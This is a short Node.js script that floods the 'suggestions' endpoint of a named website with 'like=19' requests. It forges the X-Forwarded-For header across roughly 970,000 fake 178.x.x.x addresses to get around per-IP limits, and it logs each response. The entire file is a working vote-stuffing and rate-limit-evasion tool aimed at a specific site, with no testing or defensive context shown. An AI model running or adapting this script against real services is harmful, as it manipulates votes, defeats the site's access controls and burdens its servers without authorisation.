var request = require("request");

async function xd() {
    var limit = 30;
    var pending = 0;
    for (let i = 1; i < 100; i++) {
        for (let j = 1; j < 100; j++) {
            for (let k = 1; k < 100; k++) {
                if(pending < limit) {
                    let options = {
                        method: 'GET',
                        url: 'https://ceapa.cool/suggestions/',
                        qs: {like: '19'},
                        headers: {'x-forwarded-for': "178." + i + "." + j + "." + k},
                    };
                    console.log("sending from ip: " + options.headers['x-forwarded-for']);
                    request(options, function (error, response) {
                        pending--;
                        console.log("result from ip: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
                    });
                    pending++;
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}

xd();
